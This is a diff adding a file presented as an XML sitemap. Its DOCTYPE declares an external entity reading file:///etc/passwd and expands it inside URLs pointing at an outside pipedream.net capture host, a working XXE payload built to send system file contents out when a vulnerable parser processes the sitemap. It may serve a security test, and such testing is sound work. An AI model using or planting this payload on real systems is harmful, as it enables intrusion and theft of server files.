@@ -1,0 +1,29 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
+  <!ENTITY xxe2 SYSTEM "aaa" >
+  <!ENTITY xxe3 "bbb" >
+  <!ENTITY xxe4 "https://enhh3uyuwb6v9lz.m.pipedream.net/ccc" >]>
+<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
+  <url>
+    <loc>https://enhh3uyuwb6v9lz.m.pipedream.net/&xxe;</loc>
+    <lastmod>2018-06-04</lastmod>
+  </url>
+  <url>
+    <loc>https://enhh3uyuwb6v9lz.m.pipedream.net/&xxe2;</loc>
+    <lastmod>2018-06-04</lastmod>
+  </url>
+  <url>
+    <loc>https://enhh3uyuwb6v9lz.m.pipedream.net/&xxe3;</loc>
+    <lastmod>2018-06-04</lastmod>
+  </url>
+  <url>
+    <loc>https://enhh3uyuwb6v9lz.m.pipedream.net/&xxe4;</loc>
+    <lastmod>2018-06-04</lastmod>
+  </url>
+  <url>
+    <loc>https://enhh3uyuwb6v9lz.m.pipedream.net/asd</loc>
+    <lastmod>2018-06-04</lastmod>
+  </url>
+</urlset>
